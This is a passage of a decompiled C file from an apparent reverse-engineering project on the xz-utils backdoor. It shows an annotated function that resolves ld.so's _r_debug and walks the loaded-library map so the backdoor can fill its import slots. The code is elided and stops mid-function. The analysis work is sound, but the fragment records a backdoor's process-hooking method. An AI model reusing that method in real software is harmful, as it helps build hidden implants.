// /home/kali/xzre-ghidra/xzregh/104A40_scan_shared_libraries_via_r_debug.c
// Function: scan_shared_libraries_via_r_debug @ 0x104A40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall scan_shared_libraries_via_r_debug(backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Resolves `_r_debug` out of ld.so, sanity-checks `_r_debug.r_version`, and then feeds a stack-resident copy of `backdoor_shared_libraries_data_t` into `scan_link_map_and_init_shared_libs` to walk `r_map`. Successful scans populate the shared `backdoor_data_t` blob plus the caller-provided PLT/import slots so later stages never have to touch `_r_debug` again.
 */

#include "xzre_types.h"

BOOL scan_shared_libraries_via_r_debug(backdoor_shared_libraries_data_t *data)

{
  ...
  r_debug_symbol = elf_gnu_hash_lookup_symbol(data->elf_handles->ldso,STR_r_debug,STR_GLIBC_2_2_5);
  success = FALSE;
  if (r_debug_symbol != (Elf64_Sym *)0x0) {
    ...
    if (0 < *(int *)r_debug_addr) {
      ...
      success = scan_link_map_and_init_shared_libs(*(link_map **)(r_debug_addr + 8),&tmp_state);
